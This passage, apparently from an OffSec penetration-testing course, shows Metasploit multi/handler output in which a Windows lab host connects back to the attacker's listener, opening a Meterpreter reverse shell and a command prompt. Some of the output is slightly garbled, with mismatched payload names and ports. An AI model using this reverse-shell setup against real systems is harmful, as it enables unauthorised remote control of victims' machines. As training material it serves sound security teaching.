# OffSec Penetration Testing with Kali Linux

![](bbox=[0.125, 0.093, 0.875, 0.543])

Reviewing our multi/handler window, it shows that we successfully received a Meterpreter shell.

+   [+] Using configured payload generic/shell_reverse_tcp
[+] payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[+] Started reverse TCP handler on 192.168.50.1:443
[+] Sending stage (1751174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:1443 -> 192.168.50.62:52273)..\.\.

```
meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.

C:\Users\offsec\Desktop>whoami
whoami
client01@offsec
```

Listing 253 - Receiving the meterpreter session

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.